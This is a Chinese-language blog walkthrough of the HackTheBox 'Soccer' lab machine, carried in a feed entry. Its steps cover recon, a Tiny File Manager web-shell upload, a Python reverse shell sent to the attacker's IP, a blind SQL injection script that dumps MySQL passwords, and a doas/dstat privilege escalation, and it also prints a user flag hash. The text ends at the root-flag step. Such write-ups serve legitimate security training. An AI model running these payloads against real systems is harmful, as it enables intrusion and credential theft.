    <link href="https://yoloyolo.top/2023/03/05/HackTheBox-Soccer/"/>
    <id>https://yoloyolo.top/2023/03/05/HackTheBox-Soccer/</id>
    <published>2023-03-05T02:21:38.000Z</published>
    <updated>2023-03-05T15:55:20.675Z</updated>
    
    <content type="html"><![CDATA[<p>日常记录</p><a id="more"></a><h1 id="hackthebox_soccer"><a class="markdownIt-Anchor" href="#hackthebox_soccer"></a> HackTheBox_Soccer</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sV -T5 -v 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.194</span><br><span class="line">Host is up (0.52s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT     STATE SERVICE         VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp   open  http            nginx 1.18.0 (Ubuntu)</span><br><span class="line">9091&#x2F;tcp open  xmltec-xmlmail?</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port9091-TCP:V&#x3D;7.70%I&#x3D;7%D&#x3D;3&#x2F;5%Time&#x3D;640459F7%P&#x3D;x86_64-pc-linux-gnu%r(inf</span><br><span class="line">SF:ormix,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\</span><br><span class="line">SF:n\r\n&quot;)%r(drda,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x2</span><br><span class="line">SF:0close\r\n\r\n&quot;)%r(GetRequest,168,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\n</span><br><span class="line">SF:Content-Security-Policy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Opt</span><br><span class="line">SF:ions:\x20nosniff\r\nContent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nCon</span><br><span class="line">SF:tent-Length:\x20139\r\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x</span><br><span class="line">SF:20GMT\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;</span><br><span class="line">SF:\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;h</span><br><span class="line">SF:ead&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20GET\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(HTT</span><br><span class="line">SF:POptions,16C,&quot;HTTP&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Poli</span><br><span class="line">SF:cy:\x20default-src\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nC</span><br><span class="line">SF:ontent-Type:\x20text&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r</span><br><span class="line">SF:\nDate:\x20Sun,\x2005\x20Mar\x202023\x2008:52:25\x20GMT\r\nConnection:\</span><br><span class="line">SF:x20close\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;met</span><br><span class="line">SF:a\x20charset&#x3D;\&quot;utf-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Ca</span><br><span class="line">SF:nnot\x20OPTIONS\x20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RTSPRequest,16C,&quot;HTT</span><br><span class="line">SF:P&#x2F;1\.1\x20404\x20Not\x20Found\r\nContent-Security-Policy:\x20default-sr</span><br><span class="line">SF:c\x20&#39;none&#39;\r\nX-Content-Type-Options:\x20nosniff\r\nContent-Type:\x20t</span><br><span class="line">SF:ext&#x2F;html;\x20charset&#x3D;utf-8\r\nContent-Length:\x20143\r\nDate:\x20Sun,\x</span><br><span class="line">SF:2005\x20Mar\x202023\x2008:52:26\x20GMT\r\nConnection:\x20close\r\n\r\n&lt;</span><br><span class="line">SF:!DOCTYPE\x20html&gt;\n&lt;html\x20lang&#x3D;\&quot;en\&quot;&gt;\n&lt;head&gt;\n&lt;meta\x20charset&#x3D;\&quot;ut</span><br><span class="line">SF:f-8\&quot;&gt;\n&lt;title&gt;Error&lt;&#x2F;title&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;pre&gt;Cannot\x20OPTIONS\x</span><br><span class="line">SF:20&#x2F;&lt;&#x2F;pre&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;\n&quot;)%r(RPCCheck,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\</span><br><span class="line">SF:x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r(DNSVersionBindReqTCP,2F,</span><br><span class="line">SF:&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;)%r</span><br><span class="line">SF:(DNSStatusRequestTCP,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\nConnecti</span><br><span class="line">SF:on:\x20close\r\n\r\n&quot;)%r(Help,2F,&quot;HTTP&#x2F;1\.1\x20400\x20Bad\x20Request\r\</span><br><span class="line">SF:nConnection:\x20close\r\n\r\n&quot;)%r(SSLSessionReq,2F,&quot;HTTP&#x2F;1\.1\x20400\x2</span><br><span class="line">SF:0Bad\x20Request\r\nConnection:\x20close\r\n\r\n&quot;);</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>请求WEB页面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -I 10.10.11.194</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 301 Moved Permanently</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 05 Mar 2023 08:54:10 GMT</span><br><span class="line">Content-Type: text&#x2F;html</span><br><span class="line">Content-Length: 178</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Location: http:&#x2F;&#x2F;soccer.htb&#x2F;</span><br></pre></td></tr></table></figure><p>跳转至域名<code>soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;10.10.11.194\tsoccer.htb&#x27;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://soccer.htb/ /usr/share/wordlists/SecLists-master/Discovery/Web-Content/SVNDigger/all-dirs.txt -w</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;soccer.htb&#x2F;tiny&#x2F;</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p></blockquote><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>访问页面<code>http://soccer.htb/tiny/</code></p><p>源代码中存在以下内容</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://tinyfilemanager.github.io/&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span> <span class="attr">data-version</span>=<span class="string">&quot;2.4.3&quot;</span>&gt;</span>CCP Programmers<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>即版本为2.4.3</p><p>相关EXP</p><blockquote><p><a href="https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py">https://github.com/febinrev/tinyfilemanager-2.4.3-exploit/blob/main/tiny_file_manager_exploit.py</a></p></blockquote><p>适当修改脚本后运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">datas&#x3D;&#123;&quot;p&quot;:&quot;tiny&#x2F;uploads&quot;, &quot;fullpath&quot;:&quot;&#x2F;BFL&#x2F;BFL.php&quot;&#125;</span><br><span class="line">files&#x3D;&#123;&quot;file&quot;:(&quot;exp.php&quot;,&quot;&lt;?php system($_REQUEST[&#39;BFL&#39;]); ?&gt;&quot;,&quot;application&#x2F;x-php&quot;)&#125;</span><br></pre></td></tr></table></figure><p>监听端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><p>反弹Shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://soccer.htb/tiny/uploads/BFL/BFL.php?BFL=python3%20-c%20%22import%20os%2Csocket%2Csubprocess%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2710.10.16.30%27%2C9998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3Bos.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%27/bin/bash%27%2C%27-i%27%5D%29%3B%22&#x27;</span></span><br></pre></td></tr></table></figure><p>获取TTY</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p>查看WEB站点配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/default.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line">server_name 0.0.0.0;</span><br><span class="line">return 301 http:&#x2F;&#x2F;soccer.htb$request_uri;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">index index.html tinyfilemanager.php;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ \.php$ &#123;</span><br><span class="line">include snippets&#x2F;fastcgi-php.conf;</span><br><span class="line">fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.4-fpm.sock;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location ~ &#x2F;\.ht &#123;</span><br><span class="line">deny all;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/nginx/sites-enabled/soc-player.htb</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">listen 80;</span><br><span class="line">listen [::]:80;</span><br><span class="line"></span><br><span class="line">server_name soc-player.soccer.htb;</span><br><span class="line"></span><br><span class="line">root &#x2F;root&#x2F;app&#x2F;views;</span><br><span class="line"></span><br><span class="line">location &#x2F; &#123;</span><br><span class="line">proxy_pass http:&#x2F;&#x2F;localhost:3000;</span><br><span class="line">proxy_http_version 1.1;</span><br><span class="line">proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">proxy_set_header Connection &#39;upgrade&#39;;</span><br><span class="line">proxy_set_header Host $host;</span><br><span class="line">proxy_cache_bypass $http_upgrade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到新域名<code>soc-player.soccer.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.194\tsoc-player.soccer.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>访问域名<code>soc-player.soccer.htb</code></p><p>进行注册，登录</p><p>源代码中存在以下js脚本</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> input = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;connected to the server&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">input.addEventListener(<span class="string">&#x27;keypress&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">keyOne(e)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">keyOne</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">e.stopPropagation();</span><br><span class="line"><span class="keyword">if</span> (e.keyCode === <span class="number">13</span>) &#123;</span><br><span class="line">e.preventDefault();</span><br><span class="line">sendText();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendText</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> msg = input.value;</span><br><span class="line"><span class="keyword">if</span> (msg.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: msg</span><br><span class="line">&#125;))</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> append(<span class="string">&quot;????????&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;</span><br><span class="line">append(e.data)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params">msg</span>) </span>&#123;</span><br><span class="line"><span class="keyword">let</span> p = <span class="built_in">document</span>.querySelector(<span class="string">&quot;p&quot;</span>);</span><br><span class="line"><span class="comment">// let randomColor = &#x27;#&#x27; + Math.floor(Math.random() * 16777215).toString(16);</span></span><br><span class="line"><span class="comment">// p.style.color = randomColor;</span></span><br><span class="line">p.textContent = msg</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地console进行测试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>);</span><br><span class="line">ws.onmessage = <span class="function"><span class="keyword">function</span> (<span class="params">e</span>) </span>&#123;<span class="built_in">console</span>.log(e.data)&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0&quot;&#125;));</span><br><span class="line">Ticket Doesn&#39;t Exist</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ws.send(JSON.stringify(&#123;&quot;id&quot;: &quot;0 or 1&quot;&#125;));</span><br><span class="line">Ticket Exists</span><br></pre></td></tr></table></figure><p>存在SQL注入漏洞</p><p>二分法布尔注入</p><blockquote><p>pip install websocket-client</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_message</span>(<span class="params">ws, message</span>):</span></span><br><span class="line"><span class="keyword">global</span> result</span><br><span class="line">result = message  <span class="comment"># handle the received message here</span></span><br><span class="line">ws.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_error</span>(<span class="params">ws, error</span>):</span></span><br><span class="line">print(error)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_close</span>(<span class="params">ws</span>):</span></span><br><span class="line">print(<span class="string">&quot;Closed connection&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_open</span>(<span class="params">ws</span>):</span></span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">ws.send(json.dumps(send_data))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span>():</span></span><br><span class="line">websocket.enableTrace(<span class="literal">False</span>)  <span class="comment"># enable trace for debugging purposes</span></span><br><span class="line">ws = websocket.WebSocketApp(<span class="string">&quot;ws://soc-player.soccer.htb:9091&quot;</span>,</span><br><span class="line">on_message=on_message,</span><br><span class="line">on_error=on_error,</span><br><span class="line">on_close=on_close)</span><br><span class="line">ws.on_open = on_open</span><br><span class="line">ws.run_forever()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">version</span>():</span></span><br><span class="line">pos = <span class="number">1</span></span><br><span class="line">response = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">bot = <span class="number">0</span></span><br><span class="line">top = <span class="number">128</span></span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span>(bot &lt; top):</span><br><span class="line"><span class="keyword">global</span> send_data</span><br><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr(@@version,%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br><span class="line">print(send_data)</span><br><span class="line">run()</span><br><span class="line"><span class="keyword">if</span> result == <span class="string">&quot;Ticket Exists&quot;</span>:</span><br><span class="line">bot = mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">top = mid</span><br><span class="line">mid = (bot + top) // <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span>(mid == <span class="number">0</span> <span class="keyword">or</span> mid == <span class="number">127</span>):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">response = response + <span class="built_in">chr</span>(mid)</span><br><span class="line">print(response)</span><br><span class="line"><span class="keyword">if</span> mid == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">version()</span><br></pre></td></tr></table></figure><p>得到版本信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8.0.31-0ubuntu0.20.04.2</span><br></pre></td></tr></table></figure><p>查询用户信息</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select user()),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>用户信息如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">player@localhost</span><br></pre></td></tr></table></figure><p>查询库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>库名如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql,information_schema,performance_scqema,sys,soccer_db</span><br></pre></td></tr></table></figure><p>查询user表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">send_data = &#123;<span class="string">&quot;id&quot;</span>: <span class="string">&quot;59654 or ord(substr((select group_concat(user, &#x27;:&#x27; ,password) from mysql.user),%d,1))&gt;%d&quot;</span> % (pos, mid)&#125;</span><br></pre></td></tr></table></figure><p>user表如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">debian-sys-maint:PlayerOftheMatch2022,mysql.infoschema:PlayerOftheMatch2022,mysql.session:PlayerOftheMatch2022,mysql.sys:PlayerOftheMatch2022,player:PlayerOftheMatch2022,root:PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>SSH登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh player@10.10.11.194</span><br><span class="line">PlayerOftheMatch2022</span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;home&#x2F;player&#x2F;user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">71661caf8fd27d4777ef94f5ae4cfea5</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>查询SUID文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;doas</span><br></pre></td></tr></table></figure><p>查看doas配置信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /usr/<span class="built_in">local</span>/etc/doas.conf </span><br><span class="line">permit nopass player as root cmd /usr/bin/dstat</span><br></pre></td></tr></table></figure><p><code>/usr/local/bin/doas</code>, <code>/usr/local/bin/vidoas</code><br />这两个程序都能给出配置信息的路径，前者需要IDA简略分析，后者运行即可得知</p><blockquote><p>There are some alternatives to the sudo binary such as doas for OpenBSD, remember to check its configuration at /etc/doas.conf – <a href="https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/">https://0x1.gitlab.io/exploit/Linux-Privilege-Escalation/</a></p></blockquote><p>意思就是把这个doas当成sudo来处理</p><p>添加dstat配置文件并调用即可提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;import os; os.execv(&quot;/bin/sh&quot;, [&quot;sh&quot;])&#x27;</span> &gt; /usr/<span class="built_in">local</span>/share/dstat/dstat_BFL.py</span><br><span class="line">/usr/<span class="built_in">local</span>/bin/doas -u root /usr/bin/dstat --BFL</span><br></pre></td></tr></table></figure><p>查看root.txt</p><figure 